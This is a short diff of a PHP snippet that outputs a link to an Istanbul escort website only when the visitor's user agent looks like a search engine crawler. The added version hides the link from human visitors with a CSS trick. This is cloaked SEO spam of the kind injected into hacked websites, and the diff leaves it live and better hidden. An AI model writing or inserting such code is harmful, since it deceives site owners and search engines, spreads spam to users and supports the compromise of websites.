@@ -1,10 +1,7 @@
- <?php
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-$userAgents = array("google", "yandex", "yahoo", "bing");
-if(preg_match('/' . implode('|', $userAgents) . '/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
-?>
-<a target="_blank" href="http://www.escortsistanbul.com/istanbul/atakoyescort/" title="ataköy escort">ataköy escort</a>
 <?php
-}
-}
+ if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
+?>
+<style type="text/css">.mia-info {display: table-column;}</style><div class="mia-info"><a target="_blank" href="http://www.escortsistanbul.com/istanbul/atakoyescort/" title="ataköy escort">ataköy escort</a></div>
+<?php
+  }
 ?>
